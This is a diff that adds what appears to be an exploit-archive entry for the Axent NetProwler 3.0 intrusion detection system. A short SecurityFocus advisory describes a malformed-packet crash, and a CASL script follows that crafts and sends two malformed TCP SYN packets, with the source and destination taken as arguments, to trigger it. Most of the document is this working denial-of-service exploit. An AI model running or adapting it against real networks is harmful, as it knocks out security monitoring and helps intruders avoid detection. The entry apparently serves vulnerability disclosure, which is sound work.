@@ -1,0 +1,80 @@
+source: http://www.securityfocus.com/bid/1225/info
+ 
+Axent NetProwler 3.0 IDS is vulnerable to a malformed packet attack. It will crash if the Man-in-the-Middle signature encounters a packet for which the following expression is true:
+(IP_HEADER_LENGTH + TCP_HEADER_LENGTH) > IP_TOTAL_LENGTH
+ 
+According to Axent Security team, this is not a fragmented packet issue as reported in RFP2K05 By Rain Forest Puppy.
+ 
+In addition, NetProwler utilizes Microsoft JET engine 3.5 for storing incoming alert information. More information regarding the Microsoft JET engine 3.5 vulnerability can be found at:
+ 
+http://www.securityfocus.com/bid/286 
+
+#include "tcpip.casl"
+#include "packets.casl"
+
+Src = pop args;
+Dst = pop args;
+
+
+Src = getip(Src);
+Dst = getip(Dst);
+
+
+iph = copy TCPIP;
+iph.ip_version = 4;
+iph.ip_headerlen = 5;
+iph.ip_tos = 0;
+iph.ip_length = 36;
+iph.ip_id  = 2233;
+iph.ip_offset = 3;
+iph.ip_ttl = 62;
+iph.ip_protocol = 6;
+iph.ip_cksum = 38648;
+iph.ip_source = Src;
+iph.ip_destination = Dst;
+
+tch = copy SYN;
+tch.tcp_source = 1026;
+tch.tcp_destination = 2058;
+tch.tcp_seqno = 2542901;
+tch.tcp_ackno = 0;
+tch.tcp_offset = 0;
+tch.tcp_x2 = 1;
+tch.tcp_syn = 1;
+tch.tcp_window = 768;
+
+pk1data = "\x 0\x 0\x 0\x 0\x 0\x 0";
+
+
+packet = [ iph, tch, pk1data ];
+
+ip_output(packet);
+
+iph2 = copy TCPIP;
+iph2.ip_version = 4;
+iph2.ip_headerlen = 5;
+iph2.ip_tos = 0;
+iph2.ip_length = 44;
+iph2.ip_id = 2239;
+iph2.ip_mf = 1;
+iph2.ip_ttl = 62;
+iph2.ip_protocol = 6;
+iph2.ip_cksum = 30445;
+iph2.ip_source = Src;
+iph2.ip_destination = Dst;
+
+tch2 = copy SYN;
+tch2.tcp_source = 1032;
+tch2.tcp_destination = 21;
+tch2.tcp_seqno = 2816737352;
+tch2.tcp_ackno = 0;
+tch2.tcp_x2 = 10;
+tch2.tcp_syn = 1;
+tch2.tcp_window = 32120;
+tch2.tcp_cksum = 29341;
+
+pk2data = "\x 2\x 4\x 5\xb4 \x 0\x 0";
+
+packet = [ iph2, tch2, pk2data ];
+
+ip_output(packet);
